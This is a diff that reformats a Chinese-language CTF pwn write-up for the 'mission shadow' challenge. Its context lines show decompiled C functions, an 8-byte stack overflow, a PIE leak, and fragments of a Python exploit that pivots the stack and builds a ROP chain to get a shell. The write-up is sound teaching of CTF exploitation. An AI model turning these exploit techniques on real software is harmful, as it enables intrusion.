@@ -1,14 +1,17 @@
 ---
-layout: post
+layout: single
 title: "mission shadow"
 date: 2026-10-07 20:05:00 +0800
 tags: ["CTF", "Write-up"]
 description: "记录 2026 年 ctf+ 比赛中 mission shadow 题目的分析与解题过程。"
 source_folder: "Write-ups/2026/ctf+"
 lang: zh-CN
+excerpt: "记录 2026 年 ctf+ 比赛中 mission shadow 题目的分析与解题过程。"
 ---
 {% raw %}
+
 # 信息
+
 ```
     Arch:       amd64-64-little
     RELRO:      Partial RELRO
@@ -75,6 +78,7 @@ LABEL_16:
 ```
 
 直接给了pie。
+
 ```c
 int check_log()
 {
@@ -85,6 +89,7 @@ int check_log()
 ```
 
 可以创建三种task
+
 ```c
 int create_task()
 {
@@ -129,9 +134,11 @@ int create_task()
   return puts("[+] Task created.");
 }
 ```
+
 ## vuln1
 
 该函数中，
+
 ```c
 void __fastcall input_annotation(int idx)
 {
@@ -153,6 +160,7 @@ void __fastcall input_annotation(int idx)
 
 ## vuln2
 该函数中有，0x8字节的溢出，但缓冲区太短不够布置rop链。
+
 ```c
 __int64 commit_feedback()
 {
@@ -167,6 +175,7 @@ __int64 commit_feedback()
 
 
 按顺序执行task，这里不会影响出了 rdx 之外的其他寄存器。
+
 ```c
 int execute_task()
 {
@@ -193,6 +202,7 @@ int execute_task()
 ## step1
 
 接收pie
+
 ```python
     check()
     ru(b'[!] Abnormal data detected: ')
@@ -203,6 +213,7 @@ int execute_task()
 ## step2
 
 进行栈迁移
+
 ```python
     # 栈迁移
     create(1,b'a'*0x5 + b'\n')
@@ -215,6 +226,7 @@ int execute_task()
 ## step 3
 
 布置rop链子
+
 ```python
    # 布置rop
     sh = 0x4010 + p.address
@@ -251,4 +263,5 @@ def pwn():
     
     ia()
 ```
+
 {% endraw %}
